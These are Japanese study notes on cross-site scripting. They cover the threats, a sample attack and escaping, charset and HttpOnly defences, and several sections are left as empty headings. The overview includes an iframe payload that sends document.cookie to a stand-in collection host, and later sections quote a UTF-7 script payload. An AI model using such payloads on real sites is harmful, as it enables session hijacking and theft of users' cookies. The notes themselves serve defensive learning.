# security-study

## XSS について調べてみた

### XSS の概要

ターゲットのブラウザ上で攻撃者が用意したスクリプトが実行される。
それによって以下のような脅威が発生する。

- ブラウザが保存しているクッキーを取得される
  - 成りすまし
  - クッキーに保存された個人情報の漏洩（ただし、一般的にはクッキーはセッション ID を保持するために使い、データを保存しないことが推奨される）
- 任意のクッキーをブラウザに保存させられる
  - セッション ID が利用者に送り込まれ、セッション ID の固定化攻撃に悪用される
- 本物サイト上に偽のページが表示される
  - フィッシングによる重要情報の漏洩

例えば、以下のような手口で行われる。

- 攻撃者が罠サイトを用意する
- 罠サイトの iframe 要素の中に脆弱なサイトが表示される
- クッキー値をクエリ文字列につけると情報収集ページに遷移する（XSS 攻撃！）
- 情報収集ページから攻撃者にクッキー値を送信する
- 罠サイトにターゲット がアクセスすれば XSS 攻撃が成立！
- クッキー値を盗むことで攻撃者はターゲットに成りすませる

```html
<html>
  <body>
    <br /><br />
    <iframe
      width="320"
      height="100"
      src="http://vulnerable-site.com/example.php?
    keyword=<script>window.location='http://unlawfully-collect-cookie-site.com/example.php?sid='%2Bdocument.cookie;</script>"
    ></iframe>
  </body>
</html>
```

### JavaScript による XSS

#### React で発生するケース

### XSS の根本的解決と保険的対策

#### 根本的解決

厳密には HTML テキストの入力を許可しない場合と HTML テキストの入力を許可する場合に分けられるが、多くの Web アプリケーションでは HTML テキストの入力を許可しないものを前提とする。（HTML テキストの入力を許可する仕様が考えられる Web アプリケーションの例として、ブログや掲示板などの自由度の高い入力がある。）

- ウェブページに出力する全ての要素に対して、エスケープ処理を施す

  - ウェブページの表示に影響する特別な記号文字（「<」、「>」、「&」等）を、HTML エンティティ（「&lt;」、「&gt;」、「&amp;」等）に置換する
  - HTML タグを出力する場合は、その属性値を必ずダブルクォートで括り、それを「&quot;」にエスケープする
  - JavaScript の document.write メソッドや innerHTML プロパティ等を使用する場合も同様のエスケープ処理を行う

- HTTP レスポンスヘッダの Content-Type フィールドに文字コード（charset）を指定する

  - 文字コードの指定を省略すると、ブラウザが独自にエンコードするが、その挙動を悪用して不正なスクリプトを埋め込むことができる
  - 例えば、一部のブラウザでは「+ADw-script+AD4-alert(+ACI-test+ACI-)+ADsAPA-/script+AD4-」を UTF-7 でエンコードし、「<script>alert('test');</script>」が実行されてしまう（XSS 攻撃）
  - エスケープ処理を行っていても、ブラウザの文字エンコーディングと Web アプリケーションが想定している文字エンコーディングが異なると突破される可能性がある
  - エスケープ処理と合わせ、Web アプリケーションが想定している文字エンコーディングを指定することは必須

- URL を出力するときは、「http://」や 「https://」で始まる URL のみを許可する

  - URL には「javascript:」の形式で始まるものもあり、ウェブページに出力するリンク先や画像の URL が、外部からの入力に依存する形で動的に生成できると XSS 脆弱性が発生する
  - 利用者から入力されたリンク先の URL を「&lt;a href="リンク先の URL">」の形式でウェブページに出力する場合、その URL を「javascript:」で始めることで不正なスクリプトを埋め込める

- <script>...</script> 要素の内容を動的に生成しない

  - 外部からの入力に依存して生成されると XSS 脆弱性をうむ
  - 危険なスクリプトを区別するのは非現実的

- スタイルシートを任意のサイトから取り込めるようにしない
  - 生成するウェブページに XSS 攻撃ができるスクリプトが埋め込まれてしまう可能性がある
  - 危険なスクリプトを区別するのは非現実的

#### 保険的対策

基本的には根本的解決を図るべきだが、XSS の対策箇所が多いため、漏れが生じる可能性がある。

以下のような保険的対策をとることで、万が一漏れが生じていた場合に XSS の被害を軽減できる場合がある。

- 入力値に対してバリデーションをかける

  - 英数字などのみを入力可能なフォームでは有効
  - 幅広い文字種入力できるような仕様ではこの対策は取れない
  - 入力値の確認処理を通過した後の文字列の演算結果がスクリプト文字列を形成してしまうプログラムになっている可能性もあるため、あくまで保険にすぎない

- クッキーに HttpOnly 属性を付与する

  - JavaScript からのクッキー読み出しができなくなる
  - サーバー側のセッションを持続させるクッキーは JavaScript が利用する必要はないので、 HttpOnly 属性をつける
  - しかし、クッキーを盗まれなくなるにすぎないため、これだけでは XSS による他の脅威は残ったままであることに注意が必要

### 他の攻撃との比較

#### CSRF との違い

#### セッションハイジャックとの違い

#### フィッシングとの違い

### XSS によるセキュリティインシデントの実例

## 参考

- 安全な Web アプリケーションの作り方 第 2 版 徳丸浩
- [安全なウェブサイトの作り方 - 1.5 クロスサイト・スクリプティング](https://www.ipa.go.jp/security/vuln/websecurity/cross-site-scripting.html)
- [HTTP Cookie の使用](https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies)
